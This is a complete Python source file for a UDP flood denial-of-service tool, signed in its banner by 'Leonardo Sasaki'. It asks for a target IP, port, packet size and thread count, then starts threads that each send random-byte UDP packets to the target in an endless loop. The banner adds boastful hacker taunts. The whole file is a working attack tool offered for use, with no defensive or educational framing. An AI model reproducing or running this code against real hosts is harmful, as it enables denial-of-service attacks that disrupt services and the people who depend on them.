try:
    import threading
    import socket
    import random
    import sys
    
except ImportError as e:
    print(f"\033[1;31m[ERROR] \033[0m\xBB {e}")
    sys.exit()

def random_phrase():
    ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy", "marreta cabeça de rato", "S4SUK3"]
    phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA", "hacked FBI", "hacked u", "is looking 4 u", "is right behind you", "has hype"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[2;31m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: 1.3 \t Coded by Leonardo Sasaki\n\033[0m
    """)

def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m bytes sent to \033[1;35m{ip}\033[0m")

def main():
    try:
        if sys.version_info[0] != 3:
            print("\033[1;31m[ERROR] \033[0m\xBB Please run the tool using Python 3")
            sys.exit()
        
        if len(sys.argv) < 5:
            banner()

        IP       = input("\033[1;34m[>] \033[2;32mEnter the target ip \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("\033[1;34m[>] \033[2;32mEnter the target port \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE     = int(input("\033[1;34m[>] \033[2;32mEnter the packet size \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT    = int(input("\033[1;34m[>] \033[2;32mEnter how many threads to use \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 65535 or PORT < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB Please, choose a port between 1 and 65535")
            sys.exit(1)

        if SIZE > 65500 or SIZE < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB Please, choose a size between 1 and 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] \033[0mExiting...")
        sys.exit()
    
    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error ocurred initializing thread {i}: {e}")            

if __name__ == "__main__":
    main()
